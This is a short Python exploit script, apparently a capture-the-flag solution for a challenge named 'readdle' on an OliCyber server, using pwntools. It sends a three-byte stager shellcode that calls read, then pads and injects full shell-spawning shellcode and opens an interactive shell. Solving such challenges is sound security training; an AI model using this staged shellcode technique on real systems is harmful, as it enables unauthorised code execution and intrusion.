from pwn import *

context.arch = 'amd64'
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote("readdle.challs.olicyber.it", 10018)
else:
    r = gdb.debug('./readdle', '''
                  b main
                  continue
                  ''')

r.recvuntil(b"Enter your shellcode (max 4 bytes): \n")

#read syscall: rsi <- address of buffer, rdx <- size of buffer
shellcode = asm('pop rdx; syscall') #3 bytes shellcode
r.sendline(shellcode)   

r.sendline(b'a'*3+asm(shellcraft.sh())) #rsi points to 0x1337000, but the next instruction is at 0x1337003 so we need to add 3 bytes of padding
r.interactive()